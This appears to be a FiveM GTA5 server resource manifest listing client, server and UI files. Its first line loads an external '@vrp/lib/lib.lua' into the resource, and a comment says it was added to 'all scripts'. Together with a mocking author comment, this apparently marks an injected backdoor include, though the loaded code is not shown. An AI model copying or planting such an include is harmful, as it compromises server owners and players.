client_script "@vrp/lib/lib.lua" --Para remover esta pendencia de todos scripts, execute no console o comando "uninstall"

fx_version 'adamant'
game 'gta5'

-- Pega Trouxa Comunista By Bad Trip :)

client_scripts {
	"@vrp/lib/utils.lua",
	"client.lua"
}
server_scripts {
	"@vrp/lib/utils.lua",
	"server.lua"
}
ui_page "ui/ui.html"

files {
	"ui/ui.html",
	"ui/jquery.min.js",
	"ui/wurfl.js"
}
shared_script "@rare_ac/natives.lua"
client_script "@rare_ac/stopper.lua"              